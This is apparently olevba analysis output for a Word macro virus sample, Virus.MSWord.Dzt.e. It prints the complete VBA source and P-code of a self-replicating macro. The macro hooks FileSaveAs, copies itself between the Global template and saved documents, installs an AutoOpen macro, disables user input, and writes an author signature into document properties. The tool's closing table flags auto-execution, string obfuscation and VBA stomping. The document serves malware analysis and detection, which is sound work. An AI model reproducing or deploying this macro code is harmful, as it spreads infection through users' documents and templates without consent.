olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dzt.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dzt.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Dzt.e - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim FileBaru$, FileMacro$
Dim salah

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
FileBaru$ = ""
FileMacro$ = ""
salah = 0
WordBasic.DisableInput (1)
WordBasic.DisableAutoMacros (1)
On Error GoTo -1: On Error GoTo CekError
FileMacro$ = WordBasic.[MacroFileName$]()
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
FileBaru$ = WordBasic.[FileName$]()
CopyToFile
If salah <> 0 Then CopyToGlobal
Aksi
WordBasic.FileSaveAs dlg
GoTo Selesai

CekError:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Selesai:
End Sub

Private Sub CopyToFile()
On Error GoTo -1: On Error GoTo finish
CekCopyToFile
If salah = 0 Then
    CopyAOF
End If
finish:
End Sub

Private Sub CekCopyToFile()
On Error GoTo -1: On Error GoTo fin
WordBasic.MacroCopy "Global:FileSaveAs", FileBaru$ + ":FileSaveAs", 1
fin:
salah = Err.Number
End Sub

Private Sub CopyToGlobal()
On Error GoTo -1: On Error GoTo fin
CopyAOtoG
WordBasic.MacroCopy FileMacro$ + ":FileSaveAs", "Global:FileSaveAs", 1
fin:
salah = Err.Number
End Sub

Private Sub CopyAOtoG()
On Error GoTo -1: On Error GoTo finish
WordBasic.MacroCopy FileMacro$ + ":AutoOpen", "Global:FileSave", 1
finish:
End Sub

Private Sub CopyAOF()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy "Global:FileSave", FileBaru$ + ":AutoOpen", 1
finish:
End Sub

Private Sub Aksi()
On Error GoTo -1: On Error GoTo finish
WordBasic.FileSummaryInfo Comments:="DZT'96" + Chr(13) + "(c)9 April 1996 by Hikmat S/D0E94328" + Chr(13) + "comp. dept. of HFT" + Chr(13) + "Instrumentasi Elektronika" + Chr(13) + "MIPA Terapan Fakultas MIPA" + Chr(13) + "Universitas Padjadjaran" + Chr(13) + "Bandung"
finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Dzt.e - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Dzt.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/FileSaveAs - 4279 bytes
' Line #0:
' Line #1:
' 	Dim 
' 	VarDefn FileBaru
' 	VarDefn FileMacro
' Line #2:
' 	Dim 
' 	VarDefn salah
' Line #3:
' Line #4:
' 	FuncDefn (Public Sub MAIN())
' Line #5:
' 	LitStr 0x0000 ""
' 	St FileBaru$ 
' Line #6:
' 	LitStr 0x0000 ""
' 	St FileMacro$ 
' Line #7:
' 	LitDI2 0x0000 
' 	St salah 
' Line #8:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #9:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #10:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError CekError 
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0000 
' 	St FileMacro$ 
' Line #12:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #13:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #14:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #15:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #16:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St FileBaru$ 
' Line #17:
' 	ArgsCall CopyToFile 0x0000 
' Line #18:
' 	Ld salah 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	ArgsCall CopyToGlobal 0x0000 
' 	EndIf 
' Line #19:
' 	ArgsCall Aksi 0x0000 
' Line #20:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #21:
' 	GoTo Selesai 
' Line #22:
' Line #23:
' 	Label CekError 
' Line #24:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #25:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Label Selesai 
' Line #28:
' 	EndSub 
' Line #29:
' Line #30:
' 	FuncDefn (Private Sub CopyToFile())
' Line #31:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #32:
' 	ArgsCall CekCopyToFile 0x0000 
' Line #33:
' 	Ld salah 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #34:
' 	ArgsCall CopyAOF 0x0000 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	Label finish 
' Line #37:
' 	EndSub 
' Line #38:
' Line #39:
' 	FuncDefn (Private Sub CekCopyToFile())
' Line #40:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError fin 
' Line #41:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld FileBaru$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #42:
' 	Label fin 
' Line #43:
' 	Ld Err 
' 	MemLd Number 
' 	St salah 
' Line #44:
' 	EndSub 
' Line #45:
' Line #46:
' 	FuncDefn (Private Sub CopyToGlobal())
' Line #47:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError fin 
' Line #48:
' 	ArgsCall CopyAOtoG 0x0000 
' Line #49:
' 	Ld FileMacro$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #50:
' 	Label fin 
' Line #51:
' 	Ld Err 
' 	MemLd Number 
' 	St salah 
' Line #52:
' 	EndSub 
' Line #53:
' Line #54:
' 	FuncDefn (Private Sub CopyAOtoG())
' Line #55:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #56:
' 	Ld FileMacro$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000F "Global:FileSave"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #57:
' 	Label finish 
' Line #58:
' 	EndSub 
' Line #59:
' Line #60:
' 	FuncDefn (Private Sub CopyAOF())
' Line #61:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #62:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld FileBaru$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #63:
' 	Label finish 
' Line #64:
' 	EndSub 
' Line #65:
' Line #66:
' 	FuncDefn (Private Sub Aksi())
' Line #67:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #68:
' 	LitStr 0x0006 "DZT'96"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0024 "(c)9 April 1996 by Hikmat S/D0E94328"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0012 "comp. dept. of HFT"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0019 "Instrumentasi Elektronika"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001A "MIPA Terapan Fakultas MIPA"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0017 "Universitas Padjadjaran"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Bandung"
' 	Add 
' 	ParamNamed Comments 
' 	Ld WordBasic 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #69:
' 	Label finish 
' Line #70:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

